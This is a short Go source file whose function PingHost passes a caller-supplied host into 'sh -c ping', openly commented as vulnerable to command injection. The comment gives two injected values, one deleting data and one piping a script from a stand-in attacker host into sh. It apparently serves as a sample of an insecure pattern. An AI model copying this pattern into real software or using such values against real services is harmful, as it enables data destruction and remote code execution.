package diagnostics

import (
	"os/exec"
)

// PingHost runs a network reachability check against a caller-supplied host.
//
// Vulnerable: host is interpolated directly into a shell command string and
// executed via "sh -c". A host value such as "example.com; rm -rf /data"
// or "$(curl attacker.example/x | sh)" runs attacker-controlled shell code
// with the privileges of this service.
func PingHost(host string) (string, error) {
	cmd := exec.Command("sh", "-c", "ping -c 1 "+host)
	out, err := cmd.CombinedOutput()
	return string(out), err
}
